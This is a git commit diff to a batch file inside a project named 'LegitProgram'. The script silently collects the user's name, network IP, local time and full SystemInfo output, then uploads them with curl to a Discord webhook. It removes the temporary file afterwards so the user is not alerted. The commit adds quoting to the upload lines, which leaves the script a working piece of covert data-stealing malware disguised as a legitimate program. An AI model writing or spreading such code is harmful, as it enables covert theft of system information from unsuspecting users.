2a346a07d6c49230b39a20a8635496f258db044a
HXR <50058811+Takaovi@users.noreply.github.com>
2021-04-03 06:25:29 +0300

    Update file.bat

--- LegitProgram/Resources/file.bat
+++ LegitProgram/Resources/file.bat
@@ -4,9 +4,9 @@ set "webhook=https://discord.com/api/webhooks/"
 for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
 for /f "tokens=1-4 delims=/:." %%a in ("%TIME%") do (set HH24=%%a & set MI=%%b & set SS=%%c)
 curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[Report from %USERNAME% - %NetworkIP%]\nLocal time: %HH24%:%MI%```\"}"  %webhook%
-	set tempsys=%appdata%\sysinfo.txt
-	2>NUL SystemInfo > %tempsys%
-	curl --silent --output /dev/null -F systeminfo=@%tempsys% %webhook%
-	del %tempsys%
+	set "tempsys=%appdata%\sysinfo.txt"
+	2>NUL SystemInfo > "%tempsys%"
+	curl --silent --output /dev/null -F systeminfo=@"%tempsys%" %webhook%
+	del "%tempsys%"
 curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[End of report]```\"}"  %webhook%
 exit
